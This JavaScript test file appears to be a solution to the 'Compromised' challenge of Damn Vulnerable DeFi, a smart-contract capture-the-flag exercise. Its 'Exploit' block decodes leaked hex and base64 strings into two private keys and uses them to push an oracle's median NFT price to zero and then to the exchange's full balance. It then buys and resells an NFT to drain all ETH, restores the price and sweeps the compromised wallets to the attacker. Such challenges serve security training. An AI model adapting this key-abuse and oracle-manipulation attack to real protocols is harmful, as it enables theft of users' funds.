const { expect } = require('chai');
const { ethers } = require('hardhat');

describe('Compromised challenge', function () {

    const sources = [
        '0xA73209FB1a42495120166736362A1DfA9F95A105',
        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
    ];

    let deployer, attacker;
    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);

        // Initialize balance of the trusted source addresses
        for (let i = 0; i < sources.length; i++) {
            await ethers.provider.send("hardhat_setBalance", [
                sources[i],
                "0x1bc16d674ec80000", // 2 ETH
            ]);
            expect(
                await ethers.provider.getBalance(sources[i])
            ).to.equal(ethers.utils.parseEther('2'));
        }

        // Attacker starts with 0.1 ETH in balance
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x16345785d8a0000", // 0.1 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ethers.utils.parseEther('0.1'));

        // Deploy the oracle and setup the trusted sources with initial prices
        this.oracle = await TrustfulOracleFactory.attach(
            await (await TrustfulOracleInitializerFactory.deploy(
                sources,
                ["DVNFT", "DVNFT", "DVNFT"],
                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
            )).oracle()
        );

        // Deploy the exchange and get the associated ERC721 token
        this.exchange = await ExchangeFactory.deploy(
            this.oracle.address,
            { value: EXCHANGE_INITIAL_ETH_BALANCE }
        );
        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
    });

    // ------------------------------------------ EXPLOIT ------------------------------------------
    // 1. Copy leaked data from website
    // 2. Transform data into valid private keys
    // 3. Use compromised private keys to update the oracle 
    //    - Compromised keys are 2 of 3 trusted sources
    //    - Set price to 0 from both compromised wallets
    //    - Only 2 of 3 sources needed to change median price
    // 4. Attacker buys nft at no cost
    // 5. Use compromised private keys to set the oracle price equal to the exchange balance
    // 6. Attacker sells nft and collects all ETH from exchange
    // 7. Use compromised private keys to set the oracle price back to the initial price
    // 8. Send ETH from compromised wallets to attacker
    // ---------------------------------------------------------------------------------------------
    it('Exploit', async function () {    
        // Transform leaked data into private keys
        const data1 = "4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34"
        const data2 = "4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35";
        const base1 = Buffer.from(data1.split(` `).join(``), `hex`).toString(`utf8`);
		const key1 = Buffer.from(base1, `base64`).toString(`utf8`);
        const base2 = Buffer.from(data2.split(` `).join(``), `hex`).toString(`utf8`);
		const key2 = Buffer.from(base2, `base64`).toString(`utf8`);
        
        // Create compromised wallets
        let wallet1 = new ethers.Wallet(key1, ethers.provider);
        let wallet2 = new ethers.Wallet(key2, ethers.provider);
        
        // Set nft price to 0 as the compromised wallets
        await this.oracle.connect(wallet1).postPrice("DVNFT", 0);
        await this.oracle.connect(wallet2).postPrice("DVNFT", 0);
        
        // Buy an nft for no cost
        // Send 1 wei to pass 'msg.value > 0' check
        await this.exchange.connect(attacker).buyOne({value: 1});

        // Set nft price to exchange balance as the compromised wallets
        await this.oracle.connect(wallet1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        await this.oracle.connect(wallet2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        // Approve exchange for transfer of nft
        await this.nftToken.connect(attacker).approve(this.exchange.address, 0);

        // Sell nft while price is same as exchange balance
        // This will transfer the full exchange balance to the attacker
        await this.exchange.connect(attacker).sellOne(0);

        // Set nft price to initial price as the compromised wallets
        await this.oracle.connect(wallet1).postPrice("DVNFT", INITIAL_NFT_PRICE);
        await this.oracle.connect(wallet2).postPrice("DVNFT", INITIAL_NFT_PRICE);

        // Send ETH from compromised wallets to attacker
        await wallet1.sendTransaction({
            to: attacker.address,
            value: ethers.utils.parseEther("1.999")
        });
        await wallet2.sendTransaction({
            to: attacker.address,
            value: ethers.utils.parseEther("1.999")
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        
        // Exchange must have lost all ETH
        expect(
            await ethers.provider.getBalance(this.exchange.address)
        ).to.be.eq('0');
        
        // Attacker's ETH balance must have significantly increased
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
        
        // Attacker must not own any NFT
        expect(
            await this.nftToken.balanceOf(attacker.address)
        ).to.be.eq('0');

        // NFT price shouldn't have changed
        expect(
            await this.oracle.getMedianPrice("DVNFT")
        ).to.eq(INITIAL_NFT_PRICE);
    });
});
